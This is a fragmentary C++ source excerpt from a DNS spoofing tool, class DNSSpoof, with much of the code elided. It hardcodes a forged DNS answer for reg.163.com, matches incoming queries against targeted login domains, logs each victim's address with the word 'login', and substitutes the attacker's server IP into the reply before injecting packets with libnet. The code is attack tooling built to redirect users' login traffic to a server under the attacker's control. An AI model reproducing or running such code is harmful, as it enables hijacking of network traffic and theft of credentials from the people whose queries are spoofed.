...
#define DNS_REG163	(29|SWITCH_WANGYI)
...
//REG.163.COM
unsigned char reg163[33]={
0x03,0x72,0x65,0x67,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,
0x6d,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00 
...
bool DNSSpoof::ParseDNSQueries(PacketInfo* pktInfo)
{
	...
	{	
		...
		else if(strcmp("reg.163.com",name)==0)
			domainFlag=DNS_REG163;
...
// 			domainFlag=DNS_SINA_IJS;}
		...
		if(domainFlag>0 && isSwitchOn(domainFlag)){
			...
			LOG_INFO("%s login : %s",inet_ntoa(printAddr),name);
			if (type == ns_t_a){
				...
				else if(domainFlag==DNS_REG163){
					memcpy(answer,reg163,33);
					memcpy(answer+29,serverIP.ip,IP_ADDR_LEN);
					answerSize=33;
					answerRRS=1;
					unsigned int port;
...
// A+++++++++++ ///////////////////////////////////////////////////////////////////////////////////	
	...
	if(ethPalyload&&ethPalyloadLen>0)
	{
		...
		LOG_DEBUG("The last packet size is :%d\n",libnet_getpacket_size(libnetL2));
...
char* DNSSpoof::ParseMac(const u_char* packet, char* mac)
{
	//assert((packet || mac) != 0);
